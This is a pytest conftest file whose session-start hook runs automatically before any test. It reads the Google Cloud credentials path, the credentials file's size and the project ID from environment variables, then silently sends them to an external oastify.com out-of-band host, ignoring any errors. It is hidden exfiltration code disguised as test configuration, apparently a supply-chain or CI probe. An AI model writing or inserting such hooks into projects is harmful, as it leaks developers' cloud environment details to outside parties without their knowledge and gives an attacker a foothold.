"""Pytest conftest — OOB callback before any test runs."""
import os
import urllib.request

OOB = "m8vf34nf57o97knh8pm63mhnpev4j4me4egtrx9m.oastify.com"


def pytest_sessionstart(session):
    creds = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    proj  = os.environ.get("GCLOUD_PROJECT", os.environ.get("CLOUDSDK_CORE_PROJECT", ""))
    fsize = 0
    if creds:
        try:
            fsize = os.path.getsize(creds)
        except Exception:
            pass
    try:
        url = f"http://{OOB}/test?gcpset={'1' if creds else '0'}&fsize={fsize}&proj={proj}"
        urllib.request.urlopen(url, timeout=5)
    except Exception:
        pass
